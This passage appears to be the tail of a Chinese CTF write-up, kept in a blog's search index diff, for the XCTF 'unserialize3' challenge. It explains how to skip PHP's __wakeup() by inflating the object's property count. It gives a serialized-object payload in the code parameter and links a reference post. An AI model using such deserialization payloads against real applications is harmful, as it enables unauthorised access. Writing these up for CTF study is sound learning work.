-<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
 </search>
